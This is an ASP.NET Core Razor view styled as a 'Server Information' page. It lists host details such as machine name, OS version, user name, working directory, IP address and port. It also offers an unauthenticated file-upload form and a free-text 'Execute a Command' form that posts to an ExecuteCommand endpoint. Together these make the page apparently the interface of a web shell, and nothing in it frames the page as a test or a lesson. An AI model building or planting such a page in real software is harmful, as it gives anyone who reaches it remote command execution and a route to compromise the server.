@model dynamic
@{
    Layout = null;
}
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Server Information</title>
    <style>
        /* Reset styles */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #1e3c72, #2a5298);
            color: #fff;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        .container {
            max-width: 1200px;
            width: 90%;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 10px;
            box-shadow: 0 8px 15px rgba(0, 0, 0, 0.2);
            padding: 20px;
            overflow: hidden;
        }

        h1 {
            text-align: center;
            margin-bottom: 20px;
            font-size: 2.5rem;
            color: #ffce54;
        }

        table {
            width: 100%;
            border-collapse: collapse;
            margin-bottom: 20px;
        }

        th, td {
            padding: 12px 15px;
            text-align: left;
            border: 1px solid rgba(255, 255, 255, 0.2);
        }

        th {
            background: rgba(255, 255, 255, 0.2);
            color: #ffce54;
            font-weight: bold;
        }

        td {
            background: rgba(255, 255, 255, 0.1);
        }

        .form-section {
            margin-top: 20px;
            display: flex;
            flex-direction: column;
            gap: 15px;
        }

        form {
            display: flex;
            flex-wrap: wrap;
            gap: 10px;
        }

        input[type="text"], input[type="file"] {
            flex: 1;
            padding: 10px;
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 5px;
            background: rgba(255, 255, 255, 0.1);
            color: #fff;
            font-size: 1rem;
        }

        button {
            padding: 10px 20px;
            background: #ffce54;
            border: none;
            border-radius: 5px;
            color: #333;
            font-size: 1rem;
            font-weight: bold;
            cursor: pointer;
            transition: background 0.3s ease;
        }

        button:hover {
            background: #ffdc7e;
        }

        @@media (max-width: 768px) {
            h1 {
                font-size: 2rem;
            }

            table th, table td {
                font-size: 0.9rem;
                padding: 10px;
            }

            button {
                padding: 8px 16px;
                font-size: 0.9rem;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Server Information</h1>
        <table>
            <tr><th>Property</th><th>Value</th></tr>
            <tr><td>Machine Name</td><td>@Model.MachineName</td></tr>
            <tr><td>OS Version</td><td>@Model.OSVersion</td></tr>
            <tr><td>Processor Count</td><td>@Model.ProcessorCount</td></tr>
            <tr><td>Current Directory</td><td>@Model.CurrentDirectory</td></tr>
            <tr><td>System Page Size</td><td>@Model.SystemPageSize</td></tr>
            <tr><td>User Name</td><td>@Model.UserName</td></tr>
            <tr><td>Working Set (Memory)</td><td>@Model.WorkingSet</td></tr>
            <tr><td>.NET Version</td><td>@Model.DotNetVersion</td></tr>
            <tr><td>Process Uptime</td><td>@Model.ProcessUptime</td></tr>
            <tr><td>IIS Version</td><td>@Model.IISVersion</td></tr>
            <tr><td>IP Address</td><td>@Model.IPAddress</td></tr>
            <tr><td>Port</td><td>@Model.Port</td></tr>
            <tr><td>ASP.NET Core Environment</td><td>@Model.AspNetCoreEnvironment</td></tr>
        </table>

        <div class="form-section">
            <h2>Upload a File</h2>
            <form method="post" enctype="multipart/form-data" action="/ServerInfo/UploadFile">
                <input type="file" name="uploadedFile" />
                <button type="submit">Upload</button>
            </form>

            <h2>Execute a Command</h2>
            <form method="post" action="/ServerInfo/ExecuteCommand">
                <input type="text" name="command" placeholder="Enter command (e.g., dir)" />
                <button type="submit">Run</button>
            </form>
        </div>
    </div>
</body>
</html>
